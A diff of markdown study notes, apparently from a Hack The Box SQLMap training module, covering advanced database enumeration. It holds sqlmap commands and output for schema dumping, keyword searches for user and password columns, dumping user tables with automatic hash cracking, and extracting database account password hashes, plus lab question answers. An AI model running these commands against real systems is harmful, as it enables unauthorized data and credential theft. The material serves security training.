@@ -1,13 +1,16 @@
 ---
 sticker: lucide//database-backup
 ---
+
+# Advanced Database Enumeration
+
 Now that we have covered the basics of database enumeration with SQLMap, we will cover more advanced techniques to enumerate data of interest further in this section.
 
----
+***
 
-## DB Schema Enumeration
+### DB Schema Enumeration
 
-If we wanted to retrieve the structure of all of the tables so that we can have a complete overview of the database architecture, we could use the switch `--schema`:
+If we wanted to retrieve the structure of all of the tables so that we can have a complete overview of the database architecture, we could use the switch `--schema`:
 
 ```shell-session
 smoothment@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --schema
@@ -58,12 +61,11 @@ Table: users
 +---------+---------------+
 ```
 
----
+***
 
-## Searching for Data
+### Searching for Data
 
-When dealing with complex database structures with numerous tables and columns, we can search for databases, tables, and columns of interest, by using the `--search` option. This option enables us to search for identifier names by using the `LIKE` operator. For example, if we are looking for all of the table names containing the keyword `user`, we can run SQLMap as follows:
-
+When dealing with complex database structures with numerous tables and columns, we can search for databases, tables, and columns of interest, by using the `--search` option. This option enables us to search for identifier names by using the `LIKE` operator. For example, if we are looking for all of the table names containing the keyword `user`, we can run SQLMap as follows:
 
 ```shell-session
 smoothment@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -T user
@@ -98,8 +100,7 @@ do you want to dump found table(s) entries? [Y/n]
 ...SNIP...
 ```
 
-In the above example, we can immediately spot a couple of interesting data retrieval targets based on these search results. We could also have tried to search for all column names based on a specific keyword (e.g. `pass`):
-
+In the above example, we can immediately spot a couple of interesting data retrieval targets based on these search results. We could also have tried to search for all column names based on a specific keyword (e.g. `pass`):
 
 ```shell-session
 smoothment@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
@@ -143,11 +144,11 @@ Table: servers
 +----------+----------+
 ```
 
----
+***
 
-## Password Enumeration and Cracking
+### Password Enumeration and Cracking
 
-Once we identify a table containing passwords (e.g. `master.users`), we can retrieve that table with the `-T` option, as previously shown:
+Once we identify a table containing passwords (e.g. `master.users`), we can retrieve that table with the `-T` option, as previously shown:
 
 ```shell-session
 smoothment@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
@@ -195,11 +196,11 @@ We can see in the previous example that SQLMap has automatic password hashes cra
 
 Hash cracking attacks are performed in a multi-processing manner, based on the number of cores available on the user's computer. Currently, there is an implemented support for cracking 31 different types of hash algorithms, with an included dictionary containing 1.4 million entries (compiled over the years with most common entries appearing in publicly available password leaks). Thus, if a password hash is not randomly chosen, there is a good probability that SQLMap will automatically crack it.
 
----
+***
 
-## DB Users Password Enumeration and Cracking
+### DB Users Password Enumeration and Cracking
 
-Apart from user credentials found in DB tables, we can also attempt to dump the content of system tables containing database-specific credentials (e.g., connection credentials). To ease the whole process, SQLMap has a special switch `--passwords` designed especially for such a task:
+Apart from user credentials found in DB tables, we can also attempt to dump the content of system tables containing database-specific credentials (e.g., connection credentials). To ease the whole process, SQLMap has a special switch `--passwords` designed especially for such a task:
 
 ```shell-session
 smoothment@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
@@ -244,13 +245,15 @@ Tip: The '--all' switch in combination with the '--batch' switch, will automaica
 
 This basically means that everything accessible will be retrieved, potentially running for a very long time. We will need to find the data of interest in the output files manually.
 
-# Questions
----
+## Questions
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250204173240.png)
+***
 
-## First
----
+![](gitbook/cybersecurity/images/Pasted%20image%2020250204173240.png)
+
+### First
+
+***
 
 We can do the following command:
 
@@ -273,9 +276,9 @@ Table: ROUTINES
 
 Answer is `PARAMETER_STYLE`
 
+### Second
 
-## Second
----
+***
 
 ```
 python3 sqlmap.py -r Case1.txt --threads 10 --dump -D testdb -T users --batch | grep "Kimberly"
